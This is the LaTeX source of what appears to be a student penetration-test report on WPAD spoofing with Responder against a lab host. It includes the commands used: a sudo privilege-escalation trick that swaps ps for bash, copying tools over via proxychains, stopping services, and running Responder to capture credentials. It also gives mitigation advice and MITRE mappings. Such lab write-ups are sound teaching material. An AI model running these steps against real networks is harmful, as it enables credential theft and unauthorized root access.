%  Make this into a pdf document as follows:
%
%
% The edit the Report.tex file appropriately to include only those elements that
% make sense for the assignment you're reporting on.
%
% You can use a tool like TeXShop or Texmaker or some other graphical tool
% to convert Report.text into a pdf file.
%
% If you are making this with command line tools, you'd run the following command:
%
%     latex Report.tex
%
% That will generate a dvi (device independent) document file called Report.dvi
% The pages reported in the table of contents won't be correct, since latex only
% processes one pass over the document. To adjust the page numbers in the contents,
% run latex again:
%
%    latex Report.tex
%
% Then run
%
%   dvipdf Report.dvi
%
% to generate Report.pdf
%
% You can view this file to check it out by running
%
% xdg-open Report.pdf
%
% That's it.
  
\def\cvss(#1,#2,#3,#4,#5,#6,#7,#8,#9){
	\indent\textbf{CVSS Base Severity Rating: #9}  AV:#1 AC:#2 PR:#3 UI:#4 S:#5 C:#6 I:#7 A:#8}
  
\def\ttp(#1, #2, #3, #4, #5, #6){
   \indent\textbf{#1:} #2 \\
   \indent\indent\textbf{#3:} #4 \\
   \indent\indent\indent\textbf{#5:} #6 \\}

\documentclass[notitlepage]{article}

\usepackage{bibunits}
\usepackage{comment}
\usepackage{graphicx}
\usepackage{amsmath}
\usepackage{datetime}
\usepackage{numprint}

% processes above options
\usepackage{palatino}  %OR newcent ncntrsbk helvet times palatino
\usepackage{url}
\usepackage{footmisc}
\usepackage{endnotes}

\setcounter{secnumdepth}{3}
\begin{document}

\nplpadding{2}
\newdateformat{isodate}{
  \THEYEAR -\numprint{\THEMONTH}-\numprint{\THEDAY}}
  
\title{Penetration Test - Exercise 100}
\author{Esteban Calvo}
\date{\isodate\today}

\maketitle

\tableofcontents

\newpage

\section{Technical Report}

  \subsection{Finding: \emph{WPAD Spoofing for Credentials}}
  
	\subsubsection*{Severity Rating}
        Risk: Low \\
		\cvss(L,H,H,N,U,L,N,N, 1.9)
		
  	\subsubsection*{Vulnerability Description}
  		WPAD is a network protocol that allows browser to discover proxy settings in a local network. We see that a user is using WPAD protocol	and can thus 
        try and connect to it using responder to gather credentials. This attack captured credentials for a user with \textbf{Basic username {\:} not.nomen}
  	\subsubsection*{Confirmation method}
  	    Root access was gained on devbox using previous sudo exploits. Once root access was established, the responder program was imported over using scp.
        We must first disable some services before the attack is successful.
\begin{verbatim}
sudo netstat -tnlp | grep -E '80|25|53'
sudo service <name> stop
\end{verbatim}
    Where name is the name of the service as revealed from netstat. Once these services are killed, we can run the command and wait patiently while credentials are captured.
\begin{verbatim}
sudo python3 Responder.py -I ens32 -wFb
\end{verbatim}
				
    \subsubsection*{Mitigation or Resolution Strategy}
    One way to mitigate this attack would be to disable WPAD services. If this is not a feasable solution, then all web traffic must be encrypted using HTTPS to ensure
    intercepted data is not plaintext.
		



\section{Attack Narrative}

    \subsection{Initial Checks}
    Before we used responder, it was important to first use tcpdump to give some clues
    as to whether responder would work at all. To begin, we connected to devbox as usual
    and then used the previously found exploit and changed the command that was running ps
    to bash as follows.
   \begin{verbatim}
cp /usr/bin/bash /usr/bin/ps
sudo -u#-1 ps   
   \end{verbatim}
    Once we had access, we can then scp over the ssl-extras directory and use the tcpdump as follows:
\begin{verbatim}
proxychains scp -r sslstrip-extras l.strauss@devbox.artstailor.com:
proxychains scp -r /usr/share/responder l.struass@devbox.artstailor.com:
sudo ./tcpdump -i ens32 -w ~/capture.pcap -Z l.strauss
\end{verbatim}
    After examining the capture.pcap file using wireshark, the following observation was made\\
\includegraphics[width=4in]{~/Desktop/school/fall2023/pen/ex/ex100/tcpdump_1}\\
\includegraphics[width=4in]{~/Desktop/school/fall2023/pen/ex/ex100/tcpdump_2}\\
    Which signified that spoofing wpad might bear fruit as expected

    \subsection{Responder}
    Once we know that the attack might work, we can then cd over to the responder directory. Using
    the Trelis 2018 blog about responder as a guide for what flags to use, the following command was
    run
\begin{verbatim}
sudo python3 Responder.py -I ens32 -wFb
\end{verbatim}
    which yielded the following error\\
\includegraphics[width=4in]{~/Desktop/school/fall2023/pen/ex/ex100/responder_error}\\
    Examining the error, we can see we might need to shut down the services running on these ports.
    We can use the following command to see what services to shutdown
\begin{verbatim}
sudo netstat -tnlp | grep 80
sudo netstat -tnlp | grep 25
sudo netstat -tnlp | grep 53
\end{verbatim}
\includegraphics[width=4in]{~/Desktop/school/fall2023/pen/ex/ex100/netstat}\\
    We can now stop these commands using sudo service service-name stop as follows \\
\includegraphics[width=4in]{~/Desktop/school/fall2023/pen/ex/ex100/stopping_services}\\
    Running responder now yields the following censored result \\
\includegraphics[width=4in]{~/Desktop/school/fall2023/pen/ex/ex100/responder_censored}\\
    This password also doubles as a Key, but for the safety of the client, the key will remain
    censored.

    \subsection{MITRE ATT{\&}CK Framework TTPs}
    
    \subsubsection*{}
    \ttp(TA0006, Credential Access, T1557, Adversary-in-the-Middle, .001, LLMNR/NBT-NS Poisoning and SMB Relay) \\

	\subsubsection*{}
	\indent\textbf{TA0006:} Credential Access \\
   \indent\indent\textbf{T1212:} Exploitation For Credential Access \\
    
\end{document} 
